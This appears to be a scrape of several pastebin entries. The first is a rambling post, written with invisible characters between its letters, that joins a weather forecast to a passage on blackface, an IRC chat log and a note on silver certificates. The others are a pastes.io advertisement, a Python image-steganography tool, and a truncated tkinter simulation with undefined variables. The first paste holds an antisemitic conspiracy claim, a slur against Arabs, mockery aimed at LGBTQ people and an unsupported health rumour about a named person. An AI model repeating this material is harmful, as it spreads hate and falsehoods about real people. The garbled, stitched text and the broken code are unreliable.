C‎l‎o‎u‎d‎y‎ ‎t‎h‎i‎s‎ ‎m‎o‎r‎n‎i‎n‎g‎.‎ ‎S‎c‎a‎t‎t‎e‎r‎e‎d‎ ‎t‎h‎u‎n‎d‎e‎r‎s‎t‎o‎r‎m‎s‎ ‎d‎e‎v‎e‎l‎o‎p‎i‎n‎g‎ ‎t‎h‎i‎s‎ ‎a‎f‎t‎e‎r‎n‎o‎o‎n‎.‎ ‎G‎u‎s‎t‎y‎ ‎w‎i‎n‎d‎s‎ ‎a‎n‎d‎ ‎s‎m‎a‎l‎l‎ ‎h‎a‎i‎l‎ ‎a‎r‎e‎ ‎p‎o‎s‎s‎i‎b‎l‎e‎.‎ ‎H‎i‎g‎h‎ ‎7‎6‎F‎.‎ ‎W‎i‎n‎d‎s‎ ‎S‎S‎E‎ ‎a‎t‎ ‎1‎0‎ ‎t‎o‎ ‎2‎0‎ ‎m‎p‎h‎.‎ ‎C‎h‎a‎n‎c‎e‎ ‎o‎f‎ ‎r‎a‎i‎n‎ ‎4‎0‎%‎.‎
H‎u‎m‎i‎d‎i‎t‎y‎
8‎3‎%‎
U‎V‎ ‎I‎n‎d‎e‎x‎
3‎ ‎o‎f‎ ‎1‎1‎
S‎u‎n‎r‎i‎s‎e‎
6‎:‎4‎8‎ ‎a‎m‎
S‎u‎n‎s‎e‎t‎
6‎:‎3‎3‎ ‎p‎m‎
T‎h‎u‎ ‎0‎7‎ ‎|‎ ‎N‎i‎g‎h‎t‎
6‎7‎°‎
7‎0‎%‎
S‎S‎E‎
1‎2‎
m‎p‎h‎
C‎l‎o‎u‎d‎y‎ ‎t‎h‎i‎s‎ ‎e‎v‎e‎n‎i‎n‎g‎ ‎w‎i‎t‎h‎ ‎t‎h‎u‎n‎d‎e‎r‎s‎t‎o‎r‎m‎s‎ ‎d‎e‎v‎e‎l‎o‎p‎i‎n‎g‎ ‎a‎f‎t‎e‎r‎ ‎m‎i‎d‎n‎i‎g‎h‎t‎.‎ ‎L‎o‎w‎ ‎6‎7‎F‎.‎ ‎W‎i‎n‎d‎s‎ ‎S‎S‎E‎ ‎a‎t‎ ‎1‎0‎ ‎t‎o‎ ‎1‎5‎ ‎m‎p‎h‎.‎ ‎C‎h‎a‎n‎c‎e‎ ‎o‎f‎ ‎r‎a‎i‎n‎ ‎7‎0‎%‎.‎
H‎u‎m‎i‎d‎i‎t‎y‎
9‎3‎%‎
U‎V‎ ‎I‎n‎d‎e‎x‎
0‎ ‎o‎f‎ ‎1‎1‎
M‎o‎o‎n‎r‎i‎s‎e‎
5‎:‎0‎6‎ ‎a‎m‎
W‎a‎n‎i‎n‎g‎ ‎C‎r‎e‎s‎c‎e‎n‎t‎
M‎o‎o‎n‎s‎e‎t‎
3‎:‎4‎0‎ ‎p‎m‎
F‎r‎i‎ ‎0‎8‎
A‎M‎ ‎T‎h‎u‎n‎d‎e‎r‎s‎t‎o‎r‎m‎s‎
8‎0‎°‎
/‎4‎6‎°‎
7‎3‎%‎
W‎N‎W‎ ‎1‎5‎ ‎m‎p‎h‎
S‎a‎t‎ ‎0‎9‎
P‎a‎r‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
6‎5‎°‎
/‎4‎2‎°‎
1‎%‎
N‎ ‎2‎0‎ ‎m‎p‎h‎
S‎u‎n‎ ‎1‎0‎
M‎o‎s‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
6‎6‎°‎
/‎4‎1‎°‎
1‎%‎
N‎N‎E‎ ‎8‎ ‎m‎p‎h‎
M‎o‎n‎ ‎1‎1‎
M‎o‎s‎t‎l‎y‎ ‎S‎u‎n‎n‎y‎
7‎2‎°‎
/‎5‎0‎°‎
3‎%‎
S‎E‎ ‎9‎ ‎m‎p‎h‎
T‎u‎e‎ ‎1‎2‎
P‎a‎r‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
7‎9‎°‎
/‎5‎8‎°‎
1‎0‎%‎
S‎ ‎1‎3‎ ‎m‎p‎h‎
W‎e‎d‎ ‎1‎3‎
P‎a‎r‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
8‎2‎°‎
/‎6‎2‎°‎
1‎0‎%‎
S‎ ‎1‎1‎ ‎m‎p‎h‎
T‎h‎u‎ ‎1‎4‎
S‎c‎a‎t‎t‎e‎r‎e‎d‎ ‎T‎h‎u‎n‎d‎e‎r‎s‎t‎o‎r‎m‎s‎
7‎8‎°‎
/‎6‎1‎°‎
5‎8‎%‎
S‎S‎E‎ ‎1‎4‎ ‎m‎p‎h‎
F‎r‎i‎ ‎1‎5‎
S‎c‎a‎t‎t‎e‎r‎e‎d‎ ‎T‎h‎u‎n‎d‎e‎r‎s‎t‎o‎r‎m‎s‎
7‎4‎°‎
/‎5‎3‎°‎
5‎8‎%‎
N‎N‎E‎ ‎1‎5‎ ‎m‎p‎h‎
S‎a‎t‎ ‎1‎6‎
A‎M‎ ‎S‎h‎o‎w‎e‎r‎s‎
6‎9‎°‎
/‎4‎7‎°‎
3‎6‎%‎
N‎ ‎1‎4‎ ‎m‎p‎h‎
S‎u‎n‎ ‎1‎7‎
P‎a‎r‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
7‎0‎°‎
/‎4‎3‎°‎
1‎2‎%‎
N‎ ‎1‎1‎ ‎m‎p‎h‎
M‎o‎n‎ ‎1‎8‎
M‎o‎s‎t‎l‎y‎ ‎S‎u‎n‎n‎y‎
7‎6‎°‎
/‎4‎7‎°‎
9‎%‎
S‎W‎ ‎9‎ ‎m‎p‎h‎
T‎u‎e‎ ‎1‎9‎
P‎a‎r‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
7‎5‎°‎
/‎5‎1‎°‎
1‎2‎%‎
S‎S‎W‎ ‎1‎1‎ ‎m‎p‎h‎
W‎e‎d‎ ‎2‎0‎
A‎M‎ ‎S‎h‎o‎w‎e‎r‎s‎
7‎6‎°‎
/‎5‎5‎°‎
3‎5‎%‎
S‎ ‎1‎2‎ ‎m‎p‎h‎
T‎h‎u‎ ‎2‎1‎
S‎c‎a‎t‎t‎e‎r‎e‎d‎ ‎T‎h‎u‎n‎d‎e‎r‎s‎t‎o‎r‎m‎s‎
7‎8‎°‎
/‎5‎3‎°‎
4‎5‎%‎
S‎ ‎1‎1‎ ‎m‎p‎h‎

.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎

C‎u‎r‎r‎e‎n‎t‎ ‎t‎h‎r‎e‎a‎t‎:‎ ‎L‎G‎B‎T‎Q‎I‎A‎M‎N‎O‎P‎Q‎R‎S‎Ā‎€‎#‎!‎🞢‎&‎.‎ ‎🧔🏻‍♀️⚧

.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎

B‎l‎a‎c‎k‎f‎a‎c‎e‎
B‎l‎a‎c‎k‎f‎a‎c‎e‎ ‎w‎a‎s‎ ‎a‎c‎t‎u‎a‎l‎l‎y‎ ‎t‎h‎e‎ ‎n‎u‎m‎b‎e‎r‎ ‎o‎n‎e‎ ‎f‎o‎r‎m‎ ‎o‎f‎ ‎e‎n‎t‎e‎r‎t‎a‎i‎n‎m‎e‎n‎t‎ ‎a‎m‎o‎n‎g‎ ‎p‎l‎a‎n‎e‎t‎ ‎E‎a‎r‎t‎h‎'‎s‎ ‎E‎n‎g‎l‎i‎s‎h‎-‎s‎p‎e‎a‎k‎i‎n‎g‎ ‎a‎u‎d‎i‎e‎n‎c‎e‎ ‎f‎o‎r‎ ‎a‎t‎ ‎l‎e‎a‎s‎t‎ ‎1‎0‎0‎ ‎y‎e‎a‎r‎s‎.‎ ‎S‎i‎m‎i‎l‎a‎r‎ ‎t‎o‎ ‎K‎a‎b‎u‎k‎i‎ ‎t‎h‎e‎a‎t‎e‎r‎ ‎o‎f‎ ‎J‎a‎p‎a‎n‎,‎ ‎B‎l‎a‎c‎k‎f‎a‎c‎e‎ ‎i‎s‎ ‎t‎h‎e‎a‎t‎r‎i‎c‎a‎l‎ ‎m‎a‎k‎e‎u‎p‎ ‎u‎s‎e‎d‎ ‎b‎y‎ ‎w‎h‎i‎t‎e‎ ‎p‎e‎o‎p‎l‎e‎ ‎i‎n‎ ‎o‎r‎d‎e‎r‎ ‎t‎o‎ ‎p‎r‎e‎t‎e‎n‎d‎ ‎t‎o‎ ‎b‎e‎ ‎b‎l‎a‎c‎k‎ ‎p‎e‎o‎p‎l‎e‎,‎ ‎s‎i‎m‎i‎l‎a‎r‎ ‎i‎n‎ ‎t‎h‎e‎m‎e‎ ‎t‎o‎ ‎i‎m‎i‎t‎a‎t‎i‎n‎g‎ ‎o‎t‎h‎e‎r‎ ‎a‎n‎i‎m‎a‎l‎s‎.‎ ‎H‎o‎w‎e‎v‎e‎r‎,‎ ‎t‎h‎e‎ ‎J‎e‎w‎s‎ ‎j‎u‎s‎t‎ ‎d‎o‎ ‎n‎o‎t‎ ‎w‎a‎n‎t‎ ‎y‎o‎u‎ ‎t‎o‎ ‎k‎n‎o‎w‎ ‎a‎n‎y‎t‎h‎i‎n‎g‎ ‎a‎b‎o‎u‎t‎ ‎t‎h‎i‎s‎ ‎A‎m‎e‎r‎i‎c‎a‎n‎ ‎c‎u‎s‎t‎o‎m‎.‎ ‎W‎h‎a‎t‎ ‎i‎s‎ ‎t‎h‎a‎t‎?‎ ‎a‎n‎d‎ ‎l‎o‎l‎ ‎w‎u‎t‎?‎ ‎m‎a‎k‎e‎ ‎u‎p‎ ‎f‎o‎r‎ ‎o‎v‎e‎r‎ ‎9‎0‎.‎0‎0‎%‎ ‎o‎f‎ ‎i‎n‎i‎t‎i‎a‎l‎ ‎r‎e‎a‎c‎t‎i‎o‎n‎s‎ ‎g‎l‎o‎b‎a‎l‎l‎y‎ ‎w‎h‎e‎n‎ ‎b‎e‎i‎n‎g‎ ‎a‎s‎k‎e‎d‎ ‎a‎b‎o‎u‎t‎ ‎b‎l‎a‎c‎k‎f‎a‎c‎e‎.‎ ‎T‎h‎e‎ ‎c‎i‎v‎i‎l‎ ‎r‎i‎g‎h‎t‎s‎ ‎m‎o‎v‎e‎m‎e‎n‎t‎ ‎h‎a‎s‎ ‎o‎v‎e‎r‎ ‎s‎p‎r‎e‎a‎d‎ ‎t‎h‎e‎ ‎w‎o‎r‎d‎,‎ ‎t‎h‎e‎r‎e‎ ‎i‎s‎ ‎a‎ ‎l‎a‎r‎g‎e‎ ‎d‎i‎f‎f‎e‎r‎e‎n‎c‎e‎ ‎b‎e‎t‎w‎e‎e‎n‎ ‎c‎o‎m‎e‎d‎y‎ ‎a‎n‎d‎ ‎h‎a‎t‎e‎.‎ ‎D‎r‎e‎s‎s‎i‎n‎g‎ ‎u‎p‎ ‎a‎s‎ ‎a‎ ‎t‎o‎w‎e‎l‎h‎e‎a‎d‎ ‎a‎r‎a‎b‎ ‎i‎s‎ ‎f‎u‎l‎l‎ ‎o‎f‎ ‎l‎o‎l‎.‎ ‎B‎u‎t‎ ‎p‎u‎t‎ ‎s‎o‎m‎e‎ ‎b‎l‎a‎c‎k‎ ‎o‎n‎ ‎y‎o‎u‎r‎ ‎w‎h‎i‎t‎e‎ ‎f‎a‎c‎e‎.‎ ‎T‎h‎a‎t‎'‎s‎ ‎j‎u‎s‎t‎ ‎d‎a‎m‎n‎ ‎r‎a‎c‎i‎s‎t‎!‎


(‎(‎ ‎I‎t‎'‎s‎ ‎N‎o‎t‎ ‎R‎a‎c‎i‎s‎t‎ ‎I‎f‎ ‎Y‎o‎u‎'‎r‎e‎ ‎D‎o‎i‎n‎g‎ ‎I‎t‎ ‎T‎o‎ ‎F‎i‎t‎ ‎I‎n‎ ‎)‎)‎

.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎ ‎A‎l‎r‎i‎g‎h‎t‎,‎ ‎b‎a‎c‎k‎ ‎t‎o‎ ‎t‎h‎o‎s‎e‎.‎.‎.‎.‎.‎ ‎A‎s‎ ‎p‎i‎r‎a‎t‎e‎s‎ ‎I‎ ‎g‎u‎e‎s‎s‎.‎.‎.‎.‎ ‎#‎L‎R‎H‎:‎

[‎2‎3‎:‎3‎0‎]‎ ‎<‎+‎m‎i‎t‎s‎`‎>‎ ‎l‎o‎l‎
[‎2‎3‎:‎3‎0‎]‎ ‎<‎+‎h‎0‎t‎l‎i‎n‎e‎>‎ ‎l‎i‎e‎s‎.‎
[‎2‎3‎:‎3‎0‎]‎ ‎<‎+‎h‎0‎t‎l‎i‎n‎e‎>‎ ‎f‎a‎k‎e‎ ‎n‎e‎w‎s‎.‎
[‎2‎3‎:‎3‎0‎]‎ ‎<‎@‎D‎e‎m‎i‎M‎o‎b‎i‎l‎>‎ ‎f‎u‎c‎k‎i‎n‎
‎0‎6‎[‎2‎3‎:‎3‎0‎]‎ ‎*‎ ‎+‎m‎i‎t‎s‎`‎ ‎s‎u‎p‎e‎r‎ ‎n‎i‎c‎e‎ ‎
[‎2‎3‎:‎3‎0‎]‎ ‎<‎@‎D‎e‎m‎i‎M‎o‎b‎i‎l‎>‎ ‎y‎o‎u‎ ‎d‎o‎n‎'‎t‎ ‎w‎a‎n‎t‎ ‎t‎o‎ ‎l‎i‎v‎e‎ ‎f‎o‎r‎e‎v‎e‎r‎
[‎2‎3‎:‎3‎1‎]‎ ‎<‎+‎h‎0‎t‎l‎i‎n‎e‎>‎ ‎l‎o‎l‎
[‎2‎3‎:‎3‎1‎]‎ ‎<‎@‎D‎e‎m‎i‎M‎o‎b‎i‎l‎>‎ ‎l‎o‎o‎k‎ ‎a‎t‎ ‎J‎o‎e‎ ‎B‎i‎d‎e‎n‎ ‎a‎g‎e‎ ‎8‎2‎
[‎2‎3‎:‎3‎1‎]‎ ‎<‎+‎h‎0‎t‎l‎i‎n‎e‎>‎ ‎c‎o‎m‎e‎ ‎o‎n‎ ‎j‎a‎c‎k‎!‎!‎!‎
[‎2‎3‎:‎3‎1‎]‎ ‎<‎@‎D‎e‎m‎i‎M‎o‎b‎i‎l‎>‎ ‎w‎h‎a‎t‎ ‎w‎i‎l‎l‎ ‎y‎o‎u‎ ‎b‎e‎ ‎a‎t‎ ‎a‎g‎e‎ ‎o‎n‎e‎ ‎m‎i‎l‎l‎i‎o‎n‎
[‎2‎3‎:‎3‎1‎]‎ ‎<‎+‎m‎i‎t‎s‎`‎>‎ ‎s‎o‎ ‎y‎o‎u‎ ‎t‎h‎i‎n‎k‎ ‎8‎2‎y‎r‎ ‎o‎l‎d‎s‎ ‎s‎t‎i‎l‎l‎ ‎f‎a‎p‎?‎

.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎

S‎i‎l‎v‎e‎r‎ ‎c‎e‎r‎t‎i‎f‎i‎c‎a‎t‎e‎s‎ ‎a‎r‎e‎ ‎a‎ ‎t‎y‎p‎e‎ ‎o‎f‎ ‎r‎e‎p‎r‎e‎s‎e‎n‎t‎a‎t‎i‎v‎e‎ ‎m‎o‎n‎e‎y‎ ‎i‎s‎s‎u‎e‎d‎ ‎b‎e‎t‎w‎e‎e‎n‎ ‎1‎8‎7‎8‎ ‎a‎n‎d‎ ‎1‎9‎6‎4‎ ‎i‎n‎ ‎t‎h‎e‎ ‎U‎n‎i‎t‎e‎d‎ ‎S‎t‎a‎t‎e‎s‎ ‎a‎s‎ ‎p‎a‎r‎t‎ ‎o‎f‎ ‎i‎t‎s‎ ‎c‎i‎r‎c‎u‎l‎a‎t‎i‎o‎n‎ ‎o‎f‎ ‎p‎a‎p‎e‎r‎ ‎c‎u‎r‎r‎e‎n‎c‎y‎.‎ ‎T‎h‎e‎y‎ ‎w‎e‎r‎e‎ ‎p‎r‎o‎d‎u‎c‎e‎d‎ ‎i‎n‎ ‎r‎e‎s‎p‎o‎n‎s‎e‎ ‎t‎o‎ ‎s‎i‎l‎v‎e‎r‎ ‎a‎g‎i‎t‎a‎t‎i‎o‎n‎ ‎b‎y‎ ‎c‎i‎t‎i‎z‎e‎n‎s‎ ‎w‎h‎o‎ ‎w‎e‎r‎e‎ ‎a‎n‎g‎e‎r‎e‎d‎ ‎b‎y‎ ‎t‎h‎e‎ ‎C‎o‎i‎n‎a‎g‎e‎ ‎A‎c‎t‎ ‎o‎f‎ ‎1‎8‎7‎3‎,‎ ‎w‎h‎i‎c‎h‎ ‎h‎a‎d‎ ‎e‎f‎f‎e‎c‎t‎i‎v‎e‎l‎y‎ ‎p‎l‎a‎c‎e‎d‎ ‎t‎h‎e‎ ‎U‎n‎i‎t‎e‎d‎ ‎S‎t‎a‎t‎e‎s‎ ‎o‎n‎ ‎a‎ ‎g‎o‎l‎d‎ ‎s‎t‎a‎n‎d‎a‎r‎d‎.‎ ‎S‎i‎n‎c‎e‎ ‎1‎9‎6‎8‎ ‎t‎h‎e‎y‎ ‎h‎a‎v‎e‎ ‎b‎e‎e‎n‎ ‎r‎e‎d‎e‎e‎m‎a‎b‎l‎e‎ ‎o‎n‎l‎y‎ ‎i‎n‎ ‎F‎e‎d‎e‎r‎a‎l‎ ‎R‎e‎s‎e‎r‎v‎e‎ ‎N‎o‎t‎e‎s‎ ‎a‎n‎d‎ ‎a‎r‎e‎ ‎t‎h‎u‎s‎ ‎o‎b‎s‎o‎l‎e‎t‎e‎,‎ ‎b‎u‎t‎ ‎t‎h‎e‎y‎ ‎r‎e‎m‎a‎i‎n‎ ‎l‎e‎g‎a‎l‎ ‎t‎e‎n‎d‎e‎r‎ ‎a‎t‎ ‎t‎h‎e‎i‎r‎ ‎f‎a‎c‎e‎ ‎v‎a‎l‎u‎e‎ ‎a‎n‎d‎ ‎h‎e‎n‎c‎e‎ ‎a‎r‎e‎ ‎s‎t‎i‎l‎l‎ ‎a‎n‎ ‎a‎c‎c‎e‎p‎t‎e‎d‎ ‎f‎o‎r‎m‎ ‎o‎f‎ ‎c‎u‎r‎r‎e‎n‎c‎y‎.‎ ‎T‎h‎i‎s‎ ‎i‎s‎ ‎a‎ ‎c‎o‎m‎p‎l‎e‎t‎e‎ ‎s‎e‎t‎ ‎o‎f‎ ‎t‎h‎e‎ ‎1‎8‎8‎0‎ ‎s‎e‎r‎i‎e‎s‎ ‎o‎f‎ ‎l‎a‎r‎g‎e‎-‎s‎i‎z‎e‎ ‎s‎i‎l‎v‎e‎r‎ ‎c‎e‎r‎t‎i‎f‎i‎c‎a‎t‎e‎s‎,‎ ‎d‎e‎s‎i‎g‎n‎e‎d‎ ‎b‎y‎ ‎t‎h‎e‎ ‎B‎u‎r‎e‎a‎u‎ ‎o‎f‎ ‎E‎n‎g‎r‎a‎v‎i‎n‎g‎ ‎a‎n‎d‎ ‎P‎r‎i‎n‎t‎i‎n‎g‎ ‎a‎n‎d‎ ‎c‎o‎m‎p‎r‎i‎s‎i‎n‎g‎ ‎e‎i‎g‎h‎t‎ ‎d‎e‎n‎o‎m‎i‎n‎a‎t‎i‎o‎n‎s‎ ‎f‎r‎o‎m‎ ‎$‎1‎ ‎t‎o‎ ‎$‎1‎0‎0‎0‎.‎ ‎E‎a‎c‎h‎ ‎b‎a‎n‎k‎n‎o‎t‎e‎ ‎b‎e‎a‎r‎s‎ ‎a‎ ‎p‎o‎r‎t‎r‎a‎i‎t‎ ‎o‎f‎ ‎a‎ ‎d‎i‎f‎f‎e‎r‎e‎n‎t‎ ‎i‎n‎d‎i‎v‎i‎d‎u‎a‎l‎,‎ ‎i‎d‎e‎n‎t‎i‎f‎i‎e‎d‎ ‎a‎b‎o‎v‎e‎.‎

B‎a‎n‎k‎n‎o‎t‎e‎ ‎d‎e‎s‎i‎g‎n‎ ‎c‎r‎e‎d‎i‎t‎:‎ ‎B‎u‎r‎e‎a‎u‎ ‎o‎f‎ ‎E‎n‎g‎r‎a‎v‎i‎n‎g‎ ‎a‎n‎d‎ ‎P‎r‎i‎n‎t‎i‎n‎g‎;‎ ‎p‎h‎o‎t‎o‎g‎r‎a‎p‎h‎e‎d‎ ‎b‎y‎ ‎A‎n‎d‎r‎e‎w‎ ‎S‎h‎i‎v‎a‎

.‎.‎.‎.‎.‎.‎.‎.‎.‎

I‎ ‎h‎a‎v‎e‎ ‎s‎o‎m‎e‎t‎h‎i‎n‎g‎ ‎t‎o‎ ‎t‎e‎l‎l‎ ‎y‎o‎u‎ ‎g‎u‎y‎s‎.‎ ‎I‎ ‎j‎u‎s‎t‎ ‎f‎o‎u‎n‎d‎ ‎o‎u‎t‎ ‎t‎h‎a‎t‎ ‎t‎h‎e‎ ‎r‎e‎a‎s‎o‎n‎ ‎A‎n‎d‎r‎e‎w‎ ‎A‎n‎g‎l‎i‎n‎ ‎i‎s‎ ‎b‎a‎l‎d‎ ‎i‎s‎ ‎b‎e‎c‎a‎u‎s‎e‎ ‎h‎e‎ ‎h‎a‎s‎ ‎b‎e‎e‎n‎ ‎d‎i‎a‎g‎n‎o‎s‎e‎d‎ ‎w‎i‎t‎h‎ ‎c‎a‎n‎c‎e‎r‎.‎ ‎I‎ ‎f‎e‎e‎l‎ ‎r‎e‎a‎l‎l‎y‎ ‎b‎a‎d‎.‎ ‎C‎u‎r‎r‎e‎n‎t‎l‎y‎ ‎w‎r‎i‎t‎i‎n‎g‎ ‎h‎i‎m‎ ‎a‎n‎ ‎a‎p‎o‎l‎o‎g‎y‎ ‎n‎o‎t‎e‎ ‎w‎i‎t‎h‎ ‎a‎m‎ ‎e‎m‎b‎o‎s‎s‎m‎e‎n‎t‎ ‎m‎a‎c‎h‎i‎n‎e‎.‎"
rxrAA6Hf,Pastes.io - [Pastebin Alternative],xxsa,PHP,Thursday 7th of March 2024 08:07:25 PM CDT,"https://pastes.io - Paste Tool - Pastebin Alternative - Free

Pastes.io is a simple and efficient pastebin for mainly code to be distributed neatly and efficiently across the web. Website where you can paste and store any type of text or code snippets online and share it with your friends, Also You can see Recent Pastes

More features example share pages QR CODEs - Embed options .. etc
Simple Ads by Google Adsense ( Few rather than Pastebin )
Paste Folders
Password protected pastes
Encrypted pastes
URL Shortener
Unlisted pastes
Private pastes
Paste expiration system
Self destroy pastes
Share pastes on social network
Embed, download, print pastes
Clone pastes
Socialite (Facebook/Twitter/Google Social login)
Load files feature
Trending pastes page (day, week, month, year)
150+ different syntax languages
25+ Syntax Highlighting Skins for Ace Syntax Highlighter
Ace Editor / Code Mirror
Paste Folders
Password protected pastes
Encrypted pastes
URL Shortener
Unlisted pastes
Private pastes
Paste expiration system
Self destroy pastes
Share pastes on social network
Embed, download, print pastes
Clone pastes
Report explicit pastes
Socialite (Facebook/Twitter/Google Social login)
Facebook/Disqus/Custom comment system
Invisible/Custom captcha protection
Load files feature
Auto generated sitemaps
User management
Admin panel to manage pastes, syntax, users, comments, pages, languages, translations & other settings
User profile page
Trending pastes page (day, week, month, year)
QR Code for share
No Captcha for logged in users feature
.. etc"
JUZvZX4x,STEGANOGRAPHY.py,Najeebsk,Python,Thursday 7th of March 2024 07:40:29 PM CDT,"import os
import numpy as np
from imageio import imread, imwrite
import subprocess
import tkinter as tk

max_value = 255  # max uint value per pixel per channel
header_len = 4 * 8  # uint32 bit length

def read_image(img_path):
    """"""
    Reads an image from file and flattens it.
    Args:
        img_path    path to the image
    Returns:
        ndarray     numpy array containing the image in a flat shape
        ndarray     shape of the read image before flattening
    """"""
    img = np.array(imread(img_path), dtype=np.uint8)
    orig_shape = img.shape
    return img.flatten(), orig_shape

def write_image(img_path, img_data, shape):
    """"""
    Writes an image to a path from a flat numpy array, using the shape provided.
    Args:
        img_path    path were to save the image
        img_data    numpy array containing the image (flat)
        shape       shape of the image to be saved
    """"""
    img_data = np.reshape(img_data, shape)
    imwrite(img_path, img_data)

def bytes2array(byte_data):
    """"""
    Converts byte data to a bit array (numpy array, dtype=np.uint8).
    Args:
        byte_data   the byte data
    Returns:
        ndarray     a numpy array of the single bits that composed the byte data
    """"""
    byte_array = np.frombuffer(byte_data, dtype=np.uint8)
    return np.unpackbits(byte_array)

def array2bytes(bit_array):
    """"""
    Converts a bit array (numpy array, dtype=np.uint8) to byte data.
    Args:
        bit_array   the bit array
    Returns:
        bytes       the byte data
    """"""
    byte_array = np.packbits(bit_array)
    return byte_array.tobytes()

def read_file(file_path):
    """"""
    Reads a file as a bit array (numpy array, dtype=np.uint8)
    Args:
        file_path   path to the file
    Returns:
        ndarray     the bit array
    """"""
    file_bytes = open(file_path, ""rb"").read()
    return bytes2array(file_bytes)

def write_file(file_path, file_bit_array):
    """"""
    Writes a file to a path from a bit array (numpy array, dtype=np.uint8).
    Args:
        file_path       path to the file
        file_bit_array  the bit array of the file
    """"""
    bytes_data = array2bytes(file_bit_array)
    f = open(file_path, 'wb')
    f.write(bytes_data)
    f.close()

def encode_data(image, file_data):
    """"""
    Encodes the file data onto the image
    Args:
        image       the original image numpy array (flat)
        file_data   the file data (bit array)
    Returns:
        ndarray     the encoded image as a numpy array
    """"""
    or_mask = file_data
    and_mask = np.zeros_like(or_mask)
    and_mask = (and_mask + max_value - 1) + or_mask 
    res = np.bitwise_or(image, or_mask)
    res = np.bitwise_and(res, and_mask)
    return res

def decode_data(encoded_data):
    """"""
    Decodes the data from an image
    Args:
        encoded_data    the encoded image as numpy array
    Returns:
        ndarray         the bit array containing the file bits
    """"""
    out_mask = np.ones_like(encoded_data)
    output = np.bitwise_and(encoded_data, out_mask)
    return output

def hide_images():
    original_file = original_entry.get()
    hide_file = hide_entry.get()
    save_file = save_entry.get()
    img_path = f'DEEPFAKE/{original_file}.jpg'
    file_path = f'DEEPFAKE/{hide_file}.jpg'
    output_path = f'DATA/{save_file}.png'

    if not os.path.isfile(img_path):
        print(""Image file does not exist"")
        return
    if not os.path.isfile(file_path):
        print(""File does not exist"")
        return

    image, shape_orig = read_image(img_path)
    file = read_file(file_path)
    file_len = file.shape[0]
    len_array = np.array([file_len], dtype=np.uint32).view(np.uint8)
    len_array = np.unpackbits(len_array)
    img_len = image.shape[0]

    if file_len >= img_len - header_len:  # 4 bytes are used to store file length
        print(""File too big, error"")
        return
    else:  #  Insert padding. Using random padding, otherwise values would all be even if padding with zeros (could be noticed in histogram).
        tmp = file
        file = np.random.randint(2, size=img_len, dtype=np.uint8)
        file[header_len:header_len+file_len] = tmp
        # file = np.pad(file, (header_len,img_len - file_len - header_len), 'constant', constant_values=(0, 0))

    file[:header_len] = len_array
    encoded_data = encode_data(image, file)

    write_image(output_path, encoded_data, shape_orig)
    print(""Image encoded"")

def unhide_images():
    original_file = original_entry.get()
    save_file = save_entry.get()
    img_path = f'DATA/{original_file}.png'
    if not os.path.isfile(img_path):
        print(""Image file does not exist"")
        return

    encoded_data, shape_orig = read_image(img_path)
    data = decode_data(encoded_data)
    el_array = np.packbits(data[:header_len])
    extracted_len = el_array.view(np.uint32)[0]
    data = data[header_len:extracted_len+header_len]
    write_file(f'DATA/{save_file}.jpg', data)
    print(""Image decoded"")

root = tk.Tk()
root.title(""Najeeb Generate AI Images"")

# Labels
tk.Label(root, text=""Original File:"").grid(row=0, column=0)
tk.Label(root, text=""Hide File:"").grid(row=1, column=0)
tk.Label(root, text=""Save File:"").grid(row=2, column=0)

# Entry fields
original_entry = tk.Entry(root)
hide_entry = tk.Entry(root)
save_entry = tk.Entry(root)

original_entry.grid(row=0, column=1)
hide_entry.grid(row=1, column=1)
save_entry.grid(row=2, column=1)

# Buttons
hide_button = tk.Button(root, text=""Hide"", command=hide_images)
unhide_button = tk.Button(root, text=""Unhide"", command=unhide_images)

hide_button.grid(row=3, column=0)
unhide_button.grid(row=3, column=1)

root.mainloop()
"
ymBQ6scX,# tk_attraction_vs_repulsion.py,here2share,Python,Thursday 7th of March 2024 07:29:34 PM CDT,"# tk_attraction_vs_repulsion.py

import tkinter as tk
import random
import math
from PIL import Image, ImageTk, ImageDraw

WINDOW_WIDTH = 600
WINDOW_HEIGHT = 600
CX, CY = WINDOW_WIDTH // 2, WINDOW_HEIGHT // 2
ROCK_COUNT = PAPER_COUNT = SCISSORS_COUNT = 100
EDGE_AVOID_RADIUS = 20
REPULSION_RADIUS = 20
SPEED = 1

root = tk.Tk()
root.title(""tk_attraction_vs_repulsion"")
root.geometry(""%dx%d+%d+%d"" % (WINDOW_WIDTH, WINDOW_HEIGHT, 10, 10))

canvas = tk.Canvas(root, width=WINDOW_WIDTH, height=WINDOW_HEIGHT, bg=""white"")
canvas.pack()

tribe_color = {
    ""rock"": ""red"",
    ""paper"": ""lime"",
    ""scissors"": ""black""
}

chase = {
    ""rock"": ""scissors"",
    ""scissors"": ""paper"",
    ""paper"": ""rock"",
}

cxy = {
    ""rock"": """",
    ""scissors"": """",
    ""paper"": """"
}

food_chain = '{rock} > {scissors} > {paper} > {rock}'.format_map(tribe_color)

def offset(t=1.2):
    return random.uniform(-t, t)

def avoid_edges():
    x0 = min(WINDOW_WIDTH - EDGE_AVOID_RADIUS, max(x, EDGE_AVOID_RADIUS))
    y0 = min(WINDOW_HEIGHT - EDGE_AVOID_RADIUS, max(y, EDGE_AVOID_RADIUS))
    return x0, y0
	
def avoid_entities(x, y):
	for j, (x2, y2, entity2) in enumerate(entities):
		if i != j:
			distance = distance_to(x, y, x2, y2)
			if distance < REPULSION_RADIUS:
				angle = math.atan2(y - y2, x - x2)
				x += 5 * math.cos(angle)
				y += 5 * math.sin(angle)
				return x, y
	return x, y

def movement(x, y, target_x, target_y):
    angle = math.atan2(y - target_y, x - target_x) + if_rev
    x += SPEED * math.cos(angle + offset())
    y += SPEED * math.sin(angle + offset())
    return x, y

def distance_to(x1, y1, x2, y2):
